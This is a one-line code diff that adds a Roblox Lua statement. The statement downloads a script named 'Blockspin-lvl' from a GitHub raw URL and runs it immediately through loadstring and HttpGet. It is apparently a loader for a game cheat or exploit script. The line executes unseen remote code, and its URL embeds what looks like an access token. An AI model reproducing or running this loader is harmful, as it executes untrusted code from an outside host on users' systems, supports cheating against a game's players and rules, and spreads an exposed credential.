@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/zmzmmzmpp/Blockspin-lvl/refs/heads/main/Blockspin-lvl?token=GHSAT0AAAAAADQCGF2J664FKWHD4UPW45WY2JG3F6Q", true))()
